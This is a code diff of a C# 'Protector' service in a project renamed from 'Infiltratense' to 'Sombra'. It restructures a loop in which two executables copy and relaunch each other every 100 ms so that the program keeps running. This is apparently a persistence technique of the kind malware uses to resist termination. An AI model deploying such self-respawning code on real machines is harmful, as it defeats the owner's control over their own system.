@@ -2,13 +2,13 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using Infiltratense.Models;
+using Sombra.Models;
 using System.Diagnostics;
 using System.IO;
 using System.Threading;
-using Infiltratense.Service;
+using Sombra.Service;
 
-namespace Infiltratense.Service
+namespace Sombra.Service
 {
     public class Protector : HostService, IService
     {
@@ -17,8 +17,21 @@ namespace Infiltratense.Service
         public override void Run()
         {
             base.Run();
+
             Logger.Print("Protector Service Started..");
-            new Thread(Protect).Start();
+            Protect();
+            new Thread(() =>
+            {
+                while (true)
+                {
+                    Protect();
+                    Thread.Sleep(100);
+                    if (Debug)
+                    {
+                        Thread.Sleep(10000);
+                    }
+                }
+            }).Start();
         }
         public void EnsureAB()
         {
@@ -43,45 +56,38 @@ namespace Infiltratense.Service
 
         public void Protect()
         {
-            while (true)
+            if (Disable)
             {
-                if (Disable)
-                {
 
-                }
-                else if (CellFileInfo.IsGod)
+            }
+            //God create sons and exit.
+            else if (CellFileInfo.IsGod)
+            {
+                Logger.Print("God Mode. Creating A and B...");
+                EnsureAB();
+                Logger.Print("Starting A...");
+                ProcessService.StartProcess(Strings.ANameExe, Debug);
+                Environment.Exit(0);
+            }
+            //Only a file here, copy myself.
+            else if (CellFileInfo.OnlyMe())
+            {
+                Logger.PrintWarning($"Only me in the folder: {CellFileInfo.SelfName}, Creatring {CellFileInfo.PartnerName}...");
+                CopyFile(CellFileInfo.ProgramFile, CellFileInfo.CurrentPath + $@"\{CellFileInfo.PartnerName}");
+                Logger.PrintWarning($"Starting {CellFileInfo.PartnerName}...");
+                ProcessService.StartProcess(CellFileInfo.PartnerName, Debug);
+            }
+            //Have a helper file but he is not running, start him.
+            else if (ProcessInfo.OnlyMeProcess())
+            {
+                Logger.PrintWarning($"Only me running: {CellFileInfo.SelfName}, Starting {CellFileInfo.PartnerName}...");
+                try
                 {
-                    Logger.Print("God Mode. Creating A and B...");
-                    EnsureAB();
-                    Logger.Print("Starting A...");
-                    ProcessService.StartProcess(Strings.ANameExe, Debug);
-                    Environment.Exit(0);
-                }
-                //Only a file here.
-                else if (CellFileInfo.OnlyMe())
-                {
-                    Logger.PrintWarning($"Only me in the folder: {CellFileInfo.SelfName}, Creatring {CellFileInfo.PartnerName}...");
-                    CopyFile(CellFileInfo.ProgramFile, CellFileInfo.CurrentPath + $@"\{CellFileInfo.PartnerName}");
-                    Logger.PrintWarning($"Starting {CellFileInfo.PartnerName}...");
                     ProcessService.StartProcess(CellFileInfo.PartnerName, Debug);
                 }
-                //Have a helper file but he is not running.
-                else if (ProcessInfo.OnlyMeProcess())
+                catch (Exception e)
                 {
-                    Logger.PrintWarning($"Only me running: {CellFileInfo.SelfName}, Starting {CellFileInfo.PartnerName}...");
-                    try
-                    {
-                        ProcessService.StartProcess(CellFileInfo.PartnerName, Debug);
-                    }
-                    catch (Exception e)
-                    {
-                        Logger.PrintError("Error Start the partner! " + e.Message);
-                    }
-                }
-                Thread.Sleep(100);
-                if (Debug)
-                {
-                    Thread.Sleep(10000);
+                    Logger.PrintError("Error Start the partner! " + e.Message);
                 }
             }
         }
